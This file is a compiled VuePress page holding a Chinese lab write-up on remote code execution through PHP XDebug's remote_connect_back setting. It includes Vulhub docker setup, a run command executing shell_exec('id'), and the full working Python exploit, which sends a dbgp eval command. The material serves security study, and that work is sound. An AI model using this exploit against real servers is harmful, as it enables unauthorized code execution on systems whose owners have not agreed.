import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const l={},u=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>XDebug 是 PHP 的一个扩展，用于调试 PHP 代码。如果目标开启了远程调试模式，并设置 <code>remote_connect_back = 1</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>xdebug.remote_connect_back = 1
xdebug.remote_enable = 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这个配置下，我们访问 <code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的 XDebug 将会连接访问者的 IP（或 <code>X-Forwarded-For</code> 头指定的地址）并通过 dbgp 协议与其通信，我们通过 dbgp 中提供的 eval 方法即可在目标服务器上执行任意 PHP 代码。</p><p>更多说明可参考：</p>`,5),r={href:"https://xdebug.org",target:"_blank",rel:"noopener noreferrer"},d={href:"https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface",target:"_blank",rel:"noopener noreferrer"},k=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 编译及启动测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose build
docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动完成后，访问 <code>http://your-ip:8080/</code> 即可发现主页是一个简单的 phpinfo，在其中可以找到 xdebug 的配置，可见开启了远程调试。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529112232697.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>因为需要使用 dbgp 协议与目标服务器通信，所以无法用 http 协议复现漏洞。</p>`,7),v={href:"https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py",target:"_blank",rel:"noopener noreferrer"},b=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 要求用python3并安装requests库
python3 exp.py -t http://127.0.0.1:8080/index.php -c &#39;shell_exec(&#39;id&#39;);&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529112516798.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,2),m={href:"http://exp.py",target:"_blank",rel:"noopener noreferrer"},g=n("h2",{id:"漏洞-poc",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞-poc","aria-hidden":"true"},"#"),s(" 漏洞 POC")],-1),h={href:"http://exp.py",target:"_blank",rel:"noopener noreferrer"},_=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor


pool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#39;</span>
<span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">recv_xml</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    data <span class="token operator">=</span> <span class="token string">b&#39;&#39;</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> data <span class="token operator">+</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

        <span class="token keyword">while</span> data<span class="token punctuation">:</span>
            eop <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> eop <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span>eop<span class="token punctuation">]</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> data<span class="token punctuation">[</span>eop<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>blocks<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">4</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    
    <span class="token keyword">return</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">trigger</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&#39;?XDEBUG_SESSION_START=phpstorm&#39;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;XDebug remote debug code execution.&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--code&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;the code you want to execute.&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--target&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;target url.&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-l&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--listen&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;local port&#39;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    ip_port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">&#39;0.0.0.0&#39;</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>listen<span class="token punctuation">)</span>
    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sk<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ip_port<span class="token punctuation">)</span>
    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

    pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>trigger<span class="token punctuation">,</span> args<span class="token punctuation">.</span>target<span class="token punctuation">)</span>
    conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b&#39;eval -i 1 -- &#39;</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> recv_xml<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Recieve data: &#39;</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    g <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb&#39;&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;&#39;</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> g<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] No result...&#39;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> g<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Result: &#39;</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] May be not string result...&#39;</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function y(x,f){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,n("ul",null,[n("li",null,[n("a",r,[s("https://xdebug.org"),e(a)])]),n("li",null,[n("a",d,[s("https://ricterz.me/posts/Xdebug%3A A Tiny Attack Surface"),e(a)])])]),k,n("p",null,[s("Vulhub 提供了 "),n("a",v,[s("exp.py"),e(a)]),s("，指定目标 web 地址、待执行的 php 代码即可：")]),b,n("p",null,[n("strong",null,[s("重要说明：因为该通信是一个反向连接的过程，"),n("a",m,[s("exp.py"),e(a)]),s(" 启动后其实是会监听本地的 9000 端口（可通过 -l 参数指定）并等待 XDebug 前来连接，所以执行该脚本的服务器必须有外网 IP（或者与目标服务器处于同一内网）。")])]),g,n("p",null,[n("a",h,[s("exp.py"),e(a)])]),_])}const T=p(l,[["render",y],["__file","PHP XDebug 远程调试模式导致代码执行.html.vue"]]);export{T as default};
